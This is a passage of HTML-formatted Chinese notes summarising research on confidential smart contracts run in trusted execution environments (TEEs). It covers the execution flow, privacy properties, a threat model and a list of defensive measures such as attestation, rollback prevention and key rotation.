288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g></g></g></svg></mjx-container></span></li>\n<li>于此同时，区块链上存在加密的合约状态 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.854ex\" height=\"1.357ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 819.3 599.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(466,-150) scale(0.707)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></g></svg></mjx-container></span></li>\n<li>节点处理这个交易时，需要把交易中的加密投票信息 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.083ex\" height=\"1.357ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 920.5 599.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(466,-150) scale(0.707)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span> ，和区块链上的加密合约状态发送给\nTEE</li>\n<li>TEE 解密数据和合约状态 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"9.989ex\" height=\"1.927ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 4415 851.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(466,-150) scale(0.707)\"><path data-c=\"1D462\" d=\"M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1198.2,0)\"><path data-c=\"2192\" d=\"M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2476,0)\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2996,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3525,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3886,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g></g></g></svg></mjx-container></span> ; <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.357ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"8.234ex\" height=\"1.513ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -511 3639.3 668.8\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(466,-150) scale(0.707)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1097.1,0)\"><path data-c=\"2192\" d=\"M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2374.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(911,-150) scale(0.707)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></g></svg></mjx-container></span></li>\n<li>TEE 在内部计算得到新的状态 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.645ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"14.633ex\" height=\"2.362ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -759 6467.9 1044.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D451\" d=\"M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(520,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1049,0)\"><path data-c=\"1D461\" d=\"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1410,0)\"><path data-c=\"1D44E\" d=\"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1939,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2383.7,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(911,-150) scale(0.707)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3925.8,0)\"><path data-c=\"2192\" d=\"M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msubsup\" transform=\"translate(5203.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(911,363) scale(0.707)\"><path data-c=\"2032\" d=\"M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(911,-277.3) scale(0.707)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></g></svg></mjx-container></span></li>\n<li>TEE 加密状态，返回给节点 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.645ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"8.234ex\" height=\"2.362ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -759 3639.3 1044.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msubsup\"><g data-mml-node=\"mi\"><path data-c=\"1D45A\" d=\"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(911,363) scale(0.707)\"><path data-c=\"2032\" d=\"M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(911,-277.3) scale(0.707)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1542.1,0)\"><path data-c=\"2192\" d=\"M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msubsup\" transform=\"translate(2819.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D450\" d=\"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(466,363) scale(0.707)\"><path data-c=\"2032\" d=\"M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(466,-277.3) scale(0.707)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g></g></g></g></svg></mjx-container></span></li>\n<li>节点把加密后的新合约状态保存到区块链</li>\n</ul>\n<h2 id=\"系统化方法\">系统化方法</h2>\n<p>分为一层解决方案和二层解决方案。</p>\n<ul>\n<li><strong>一层解决方案</strong>：合约执行都在区块链内的TEE中。</li>\n<li><strong>二层解决方案</strong>：在链下执行智能合约的计算。</li>\n</ul>\n<p>TEE提供的隐私保护属性：</p>\n<ul>\n<li>智能合约源代码对公众隐藏</li>\n<li>输入隐私：输入到智能合约的数据对公众隐藏</li>\n<li>输出隐私：智能合约输出的结果对公众隐藏</li>\n<li>执行过程隐私</li>\n<li>地址不可链接性：防止对手通过观察用户活动来学习地址之间的关联性。</li>\n<li>地址匿名性：公众不知道谁调用了智能合约</li>\n</ul>\n<h2 id=\"威胁模型\">威胁模型</h2>\n<ul>\n<li><strong>T1.\n用户攻击者（主动/被动）</strong>：攻击者可能控制用户与TEE主机节点之间的网络。</li>\n<li><strong>T2.\nTEE攻击者（主动/被动）</strong>：攻击者可能控制TEE主机或控制TEE与区块链平台之间的网络。</li>\n<li><strong>T3.\n区块链攻击者（主动/被动）</strong>：攻击者可能丢弃、修改或延迟区块链消息。但假设大多数（或三分之二）区块链节点是诚实的。</li>\n</ul>\n<p>增强TEE主机安全性的方法</p>\n<ul>\n<li><strong>P1.\n主机惩罚机制</strong>：通过惩罚机制降低TEE主机作恶的风险。</li>\n<li><strong>P2.\n主机激励机制</strong>：通过激励机制促进TEE主机诚实行为。</li>\n<li><strong>P3.\n主机容错性</strong>：使系统能够在出现故障或失效时继续运行的解决方案。</li>\n<li><strong>P4. 主机认证</strong>：检查TEE主机身份和能力的方法。</li>\n</ul>\n<p>缓解TEE固有问题的对策</p>\n<p>TEE存在不可避免的弱点。例如，TEE容易受到侧信道攻击。这些固有弱点对TEE辅助合约系统的设计和实现直接带来了严峻挑战。此部分定义了针对这些威胁的防御方法：</p>\n<ul>\n<li><strong>P5.\nTEE证明安全性</strong>：防止TEE证明服务异常中断的方法。</li>\n<li><strong>P6.\nTEE内存限制</strong>：优化内存大小以防止机密数据溢出的方法。</li>\n<li><strong>P7.\nTEE物理攻击</strong>：防止物理攻击（如Spectre漏洞或Meltdown漏洞[57]）的方法。</li>\n<li><strong>P8.\nTEE可信计时器</strong>：为TEE运行时提供可信计时器的方法。</li>\n</ul>\n<p>防止TEE内部程序漏洞或缺陷的方法</p>\n<p>即使TEE被假定为安全，程序漏洞可能会在现实世界中破坏合约的机密性。本部分重点关注防止TEE程序出现缺陷或漏洞的措施：</p>\n<ul>\n<li><strong>P9.\n工作负载测量</strong>：防止无限循环攻击的工作负载测量方法。</li>\n<li><strong>P10.\n缺陷检测</strong>：用于建模和验证智能合约源代码的形式化技术，以减少漏洞。</li>\n<li><strong>P11.\n用户查询限制</strong>：限制用户查询，以避免因差分隐私分析[58]导致的数据泄露。</li>\n<li><strong>P12.\n区块链数据确认</strong>：允许TEE检查来自区块链的输入数据是否已确认，以防止回滚攻击[59]。</li>\n<li><strong>P13.\nTEE输出冲突</strong>：防止多个TEE产生冲突结果的方法。</li>\n</ul>\n<p>解决TEE密钥安全困境的方案</p>\n<p>合同执行中涉及多种密钥（详见附录A），包括用于状态加密/解密的TEE内部密钥（如证明密钥和TEE服务密钥）。由于服务密钥直接影响合约状态的保护，此SoK的密钥安全评估主要集中于TEE服务密钥的生成、交换和存储。</p>\n<ul>\n<li><strong>P14.\n分布式密钥协议</strong>：机密合约的密钥由分布式协议管理。</li>\n<li><strong>P15.\n密钥轮换协议</strong>：TEE用新密钥替换旧密钥以用于未来的合约加密。</li>\n<li><strong>P16.\n独立合约密钥</strong>：每个合约与一个独特密钥相关联，且独立于TEE。</li>\n<li><strong>P17.\